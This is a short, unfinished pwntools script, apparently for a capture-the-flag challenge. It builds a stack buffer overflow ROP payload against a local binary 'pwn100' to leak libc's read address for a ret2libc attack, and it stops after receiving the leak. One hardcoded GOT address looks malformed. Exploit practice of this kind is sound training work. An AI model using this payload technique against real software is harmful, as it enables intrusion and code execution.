from pwn import *
from LibcSearcher import *
context.log_level='debug'
p=process('./pwn100')
gdb.attach(p)
#e=ELF('./pwn100')
pop_rdi_ret=0x400763
pop_rsi_r15_ret=0x0400761
vul_addr=0x40063d
#puts_plt=e.plt['puts']
puts_plt=0x400500
print hex(puts_plt)
#read_got=e.got['read']
read_got=0x6001018
#read_plt=e.plt['read']
read_plt=0x400520
payload1='a'*(0x40+0x8)+p64(pop_rdi_ret)+p64(read_got)+p64(puts_plt)
p.sendline(payload1)
temp=p.recv()
#read_addr=u64(temp[0:8])
#print read_addr
